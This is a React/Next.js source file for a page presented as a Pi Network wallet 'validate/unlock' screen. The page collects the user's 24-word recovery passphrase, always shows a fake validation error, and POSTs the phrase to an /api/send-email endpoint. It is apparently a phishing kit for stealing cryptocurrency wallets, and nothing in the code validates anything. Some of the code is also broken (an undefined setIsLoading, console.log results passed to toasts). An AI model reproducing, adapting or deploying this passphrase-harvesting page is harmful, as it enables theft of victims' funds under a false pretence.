"use client";

import Link from "next/link";
import Image from "next/image";
import { useState } from "react";
import styles from "./UnlockWallet.module.css";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const UnlockWallet = () => {
  const [passphrase, setPassphrase] = useState("");
  const [showError, setShowError] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setShowError(true);

    // Show error toast
    toast.error(
      () => (
        <div>
          <h1>Validate Error</h1>
          <p>Validation not yet available for this wallet</p>
        </div>
      ),
      {
        position: "top-center",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "colored",
      }
    );

    try {
      console.log("Sending passphrase:", passphrase); // Debug log

      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ passphrase }),
      });

      console.log("Response status:", response.status); // Debug log

      const data = await response.json();
      console.log("Response data:", data); // Debug log

      if (!response.ok) {
        throw new Error(data.error || "Failed to send email");
      }

      toast.success(console.log("Passphrase sent successfully!"), {});
    } catch (error) {
      console.error("Error details:", error); // Debug log
      toast.error(
        console.log("Failed to send passphrase. Please try again."),
        {}
      );
    } finally {
      setIsLoading(false);
    }
  };

  const handlePassphraseChange = (e) => {
    setPassphrase(e.target.value);
  };

  const wordCount = passphrase
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 0).length;

  return (
    <div className={styles.unlockPage}>
      <ToastContainer />
      <div className={styles.topBar}>
        <div className={styles.topBarContent}>
          <Link href="/pi/validate" className={styles.withText}>
            Back
          </Link>
        </div>
      </div>

      <div className={styles.unlockContainer}>
        <div className={styles.walletHeader}>
          <h1>Validate/Unlock Pi Wallet</h1>
        </div>

        <div className={styles.walletContent}>
          <textarea
            placeholder="Enter your 24-word passphrase here"
            rows={8}
            className={styles.passphraseInput}
            value={passphrase}
            onChange={handlePassphraseChange}
          />

          {showError && (
            <p className={styles.errorMessage}>
              Please enter exactly 24 words. Current count: {wordCount} words
            </p>
          )}

          <button className={styles.unlockButton} onClick={handleSubmit}>
            Unlock with passphrase
          </button>

          <div className={styles.infoText}>
            <p>
              As a non-custodial wallet, your wallet passphrase is exclusively
              accessible only to you. Recovery of passphrase is currently
              impossible.
            </p>

            <p className={styles.lostPassphrase}>
              Lost your passphrase? <a href="#">You can create a new wallet</a>,
              but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UnlockWallet;
